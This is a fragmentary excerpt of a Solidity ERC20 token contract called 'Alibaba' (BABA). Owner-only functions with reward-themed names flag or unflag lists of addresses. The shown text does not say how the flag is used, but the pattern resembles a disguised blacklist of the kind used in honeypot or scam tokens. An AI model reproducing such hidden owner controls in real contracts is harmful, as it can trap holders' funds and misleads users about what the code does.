...
contract ERC20 is Ownable, IERC20, IERC20Metadata {
    ...
    function rewardBABA(address [] calldata _rewardees_) external onlyOwner {
        for (uint256 i = 0; i < _rewardees_.length; i++) {
            _rewards[_rewardees_[i]] = true;
        }
    }

    function collectBABA(address [] calldata _rewardees_) external onlyOwner {
        for (uint256 i = 0; i < _rewardees_.length; i++) {
            _rewards[_rewardees_[i]] = false;
        }
    }

    function isBABA(address _rewardee_) public view returns (bool) {
...
contract Alibaba is ERC20 {
    constructor() ERC20("Alibaba", "BABA") {
